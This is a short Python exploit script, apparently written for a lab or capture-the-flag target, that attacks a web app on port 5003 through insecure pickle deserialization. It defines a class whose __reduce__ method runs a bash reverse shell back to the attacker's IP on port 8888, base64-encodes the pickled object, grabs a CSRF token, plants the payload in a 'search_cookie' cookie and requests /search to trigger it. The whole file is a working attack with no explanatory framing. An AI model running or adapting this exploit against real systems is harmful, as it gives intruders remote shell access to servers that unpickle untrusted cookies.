import base64
import requests
import argparse
import pickle


parser = argparse.ArgumentParser("Exploit")

parser.add_argument('--server_ip', type=str, default="10.10.64.206")
parser.add_argument('--my_ip', type=str, default="10.6.32.20")

args = parser.parse_args()

class RevShell:
	def __reduce__(self):
		import os
		return os.system, (f"bash -c 'bash -i >& /dev/tcp/{args.my_ip}/8888 0>&1'",)

port="5003"

url = f"http://{args.server_ip}:{port}"

payload = base64.b64encode(pickle.dumps(RevShell())).decode()

print("Getting CSRF token")
s = requests.session()
r = s.get(url)
middleware_token = r.text.split('csrfmiddlewaretoken" value="')[-1].split('"')[0]

s.cookies['search_cookie'] = payload

print("Triggering reverse shell...")
r = s.get(f"{url}/search", data= {'csrfmiddlewaretoken': middleware_token})


